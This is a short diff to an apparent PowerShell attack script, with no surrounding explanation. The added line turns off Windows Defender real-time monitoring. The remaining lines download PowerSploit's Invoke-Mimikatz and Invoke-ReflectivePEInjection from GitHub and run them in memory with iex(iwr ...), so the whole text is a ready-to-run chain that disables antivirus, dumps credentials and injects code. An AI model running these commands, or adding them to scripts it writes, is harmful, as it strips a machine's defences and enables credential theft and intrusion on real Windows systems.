@@ -1,3 +1,5 @@
+Set-MPPreference -DisableRealtimeMonitoring $true
+
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing)
 
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 -usebasicparsing)
